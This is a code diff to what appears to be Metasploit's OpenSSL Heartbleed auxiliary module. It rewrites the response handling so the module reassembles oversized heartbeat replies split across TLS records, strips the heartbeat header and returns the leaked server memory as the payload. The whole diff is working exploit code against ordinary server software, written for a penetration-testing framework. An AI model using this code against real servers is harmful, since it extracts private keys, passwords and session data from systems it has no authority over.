@@ -71,6 +71,8 @@ class MetasploitModule < Msf::Auxiliary
   SSL_RECORD_HEADER_SIZE = 0x05
   HANDSHAKE_RECORD_TYPE = 0x16
   HEARTBEAT_RECORD_TYPE = 0x18
+  HEARTBEAT_MESSAGE_HEADER_SIZE = 3
+  HEARTBEAT_RESPONSE_TYPE = 2
   ALERT_RECORD_TYPE = 0x15
   HANDSHAKE_SERVER_HELLO_TYPE = 0x02
   HANDSHAKE_CERTIFICATE_TYPE = 0x0b
@@ -470,47 +472,60 @@ class MetasploitModule < Msf::Auxiliary
 
     vprint_status("Sending Heartbeat...")
     sock.put(heartbeat_request(heartbeat_length))
-    hdr = get_data(SSL_RECORD_HEADER_SIZE)
-    if hdr.nil? || hdr.empty?
-      vprint_error("No Heartbeat response...")
-      disconnect
-      return
-    end
+    heartbeat_data = String.new.b
+    payload_length = nil
 
-    unpacked = hdr.unpack('Cnn')
-    type = unpacked[0]
-    version = unpacked[1] # must match the type from client_hello
-    len = unpacked[2]
-
-    # try to get the TLS error
-    if type == ALERT_RECORD_TYPE
-      res = get_data(len)
-      alert_unp = res.unpack('CC')
-      alert_level = alert_unp[0]
-      alert_desc = alert_unp[1]
-
-      # http://tools.ietf.org/html/rfc5246#section-7.2
-      case alert_desc
-      when 0x46
-        msg = 'Protocol error. Looks like the chosen protocol is not supported.'
-      else
-        msg = 'Unknown error'
+    # Vulnerable OpenSSL splits oversized messages across TLS records. Their
+    # bodies contain one heartbeat header, then payload and ignorable padding.
+    # https://www.rfc-editor.org/rfc/rfc6520#section-4
+    loop do
+      hdr = get_data(SSL_RECORD_HEADER_SIZE)
+      unless hdr && hdr.bytesize == SSL_RECORD_HEADER_SIZE
+        vprint_error("No Heartbeat response...") if heartbeat_data.empty?
+        break
       end
-      vprint_error("#{msg}")
-      disconnect
-      return
+
+      type, version, len = hdr.unpack('Cnn')
+      if type == ALERT_RECORD_TYPE
+        alert_desc = get_data(len).getbyte(1)
+        # https://www.rfc-editor.org/rfc/rfc5246#section-7.2
+        msg = alert_desc == 0x46 ? 'Protocol error. Looks like the chosen protocol is not supported.' : 'Unknown error'
+        vprint_error(msg)
+        break
+      end
+
+      unless type == HEARTBEAT_RECORD_TYPE && version == TLS_VERSION[tls_version]
+        vprint_error("Unexpected Heartbeat response header (#{to_hex_string(hdr)})")
+        break
+      end
+      break if len.zero?
+
+      fragment = get_data(len)
+      break if fragment.nil? || fragment.empty?
+
+      heartbeat_data << fragment
+      if heartbeat_data.bytesize >= HEARTBEAT_MESSAGE_HEADER_SIZE
+        unless heartbeat_data.getbyte(0) == HEARTBEAT_RESPONSE_TYPE
+          vprint_error('Unexpected Heartbeat message type')
+          break
+        end
+
+        payload_length ||= heartbeat_data.byteslice(1, 2).unpack1('n')
+        break if heartbeat_data.bytesize >= HEARTBEAT_MESSAGE_HEADER_SIZE + payload_length
+      end
+      break if fragment.bytesize < len
     end
 
-    unless type == HEARTBEAT_RECORD_TYPE && version == TLS_VERSION[tls_version]
-      vprint_error("Unexpected Heartbeat response header (#{to_hex_string(hdr)})")
-      disconnect
-      return
+    payload = heartbeat_data.byteslice(HEARTBEAT_MESSAGE_HEADER_SIZE, payload_length) unless payload_length.nil?
+    payload = nil if payload&.empty?
+    if payload
+      if payload.bytesize < payload_length
+        vprint_status("Partial heartbeat payload: #{payload.bytesize} of #{payload_length} bytes")
+      end
+      vprint_status("Heartbeat response, #{payload.bytesize} bytes")
     end
-
-    heartbeat_data = get_data(heartbeat_length)
-    vprint_status("Heartbeat response, #{heartbeat_data.length} bytes")
     disconnect
-    heartbeat_data
+    payload
   end
 
   # Stores received data
